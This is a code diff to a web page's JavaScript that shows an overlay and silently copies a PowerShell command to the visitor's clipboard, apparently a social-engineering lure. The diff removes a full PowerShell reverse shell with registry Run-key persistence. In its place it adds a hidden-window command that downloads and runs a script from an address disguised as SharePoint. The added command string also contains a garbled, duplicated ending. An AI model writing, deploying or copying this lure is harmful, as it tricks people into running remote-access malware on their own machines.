@@ -165,30 +165,7 @@
                 overlay.classList.add('active');
 
                 // Copy the PowerShell command to clipboard
-                const textToCopy = `while ($true) {
-    try {
-        $client = New-Object System.Net.Sockets.TCPClient('192.168.1.10', 4444);
-        $stream = $client.GetStream();
-        [byte[]]$bytes = 0..65535|%{0};
-        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
-            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
-            $sendback = (iex $data 2>&1 | Out-String );
-            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-            $stream.Write($sendbyte, 0, $sendbyte.Length);
-            $stream.Flush()
-        }
-        $client.Close();
-    } catch {
-        Start-Sleep -Seconds 5;  # Wait before reconnecting
-    }
-}
-
-# Persistence via Registry (Run Key)
-$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-$regName = "Payload"
-$regValue = "powershell -ExecutionPolicy Bypass -File $PSCommandPath"
-Set-ItemProperty -Path $regPath -Name $regName -Value $regValue`;
+                const textToCopy = `powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri \'http://my.sharepoint.com:personal%file%2F%3Fdmr%3D1%26ec%3Dwgc-my-share&followup=id@192.168.1.12:8080/\' -OutFile \'.\\1.ps1\'; & \'.\\1.ps1\'"/\' -OutFile \'.\\1.ps1\'; & \'.\\1.ps1\'"`;
                 const tempTextArea = document.createElement("textarea");
                 tempTextArea.value = textToCopy;
                 document.body.appendChild(tempTextArea);
